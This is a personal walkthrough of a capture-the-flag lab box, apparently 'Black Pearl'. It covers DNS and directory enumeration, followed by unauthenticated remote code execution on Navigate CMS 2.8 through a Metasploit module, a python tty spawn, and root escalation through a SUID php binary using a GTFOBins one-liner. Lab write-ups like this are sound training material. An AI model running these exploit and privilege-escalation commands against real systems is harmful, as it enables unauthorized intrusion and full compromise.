80 - 10.0.2.154 - 15/02/2024
Default Nginx page

Directory busting with [[cheat#ffuf]]  + [[cheat#Nikto]] + [[cheat#dirb]]
We found a /secret
`/secret` contains a file -->  that tells that here we con't find anything

53 - 10.0.2.154:

### Enumerating DNS
We'll use [[cheat#dnsrecon]] to gather some info about the victim host
`dnsrecon -r 127.0.0.1/24 -n 10.0.2.154 -d blabla`
![[Pasted image 20240216094823.png]]
as you can see -->  we have found a <span style="color:#00b050">DNS POINTER record</span>:
                 record that maps an IP address to the domain name. 
                 It’s often called a "reverse DNS entry"

How can we visit this domain name:
we add inside our `/etc/hosts` file -->  1 line with the victim ip + the domain
![[Pasted image 20240216095524.png]]

now:
- close your browser
- try to connect http://blackpearl.tcm
- we find a php page
- nothing interesting

but:
we can do directory bursting again on http://blackpearl.tcm

### ffuf
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://blackpearl.tcm/FUZZ_VARIABLE`
![[Pasted image 20240216115329.png]]
we found 1 subdirectory -->  navigate
=>
let's connect to http://blackpearl.tcm/navigate
=>
we'll find a NAVIGATE CMS login page
in the bottom-right corner we can see the version -->  navigate cms v2.8
![[Pasted image 20240216115428.png]]
=>
search on google for -->  - navigate cms default credentials 
				     - [navigate cms exploit](https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)

We have found an exploit for -->   <span style="color:#00b050">Unauthenticated Remote Code Execution</span> 
								 (using metasploit)

## Metasploit
`msfconsole`
`use exploit/multi/http/navigate_cms_rce`
`options`
`set RHOSTS 10.0.2.154 `        victim ip
`set VHOST blackpearl.tcm`
`run`

=>
<span style="color:#00b050">we have a shell</span><span style="color:#00b050">!</span> 
type `shell`
![[Pasted image 20240216115925.png]]
> [!WARNING] 
> We don't have a normal shell:
> - it is anyway a shell that works  (try to write command whoami for example)
> - but it's difficult to read
> =>
> we need to spawn a tty shell

## Spawn a tty shell
Search on google for -->  [spawning a tty shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
you can spawn the shell with python
BUT:
you need to check if the system has python:
`which python`
`python -c 'import pty; pty.spawn("/bin/bash")'`
![[Pasted image 20240216120024.png]]
<span style="color:#00b050">now we have a normal shell</span>:
=>
- let's find some privilege escalation
- try sudo -l       (it doesn't exist)
- try use [[cheat#linpeas|linpeas]]
- ![[Pasted image 20240216120521.png]]

## Privilege Escalation
we'll use [[cheat#linpeas|linpeas]]
run it 
we'll see that --> there are some programs that have set the <span style="color:#00b050">SUID bit</span>
![[Pasted image 20240216114009.png]]

### SUID
to check better the commands that have the s bit we can use this:
`find / -type f -perm -4000 2>/dev/null`
![[Pasted image 20240216120747.png]]
now we can use -->  [[cheat#GTFOBins|GTFOBins]]
                 to find if 1 of these commands have vuln to do privilege escalation
=>
- go to GTFOBins
- select SUID 
- search for one of the commands that we found
- we find -->  <span style="color:#00b050">php</span>
![[Pasted image 20240216114514.png]]
=>
substitute ./php with our path to php and run the last line
`/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"`

if we check the id -->  we'll see that the <span style="color:#00b050">Effective UID is root</span>
![[Pasted image 20240216120935.png]]

<span style="color:#00b050">finish :)</span>
![[Pasted image 20240216121230.png]]
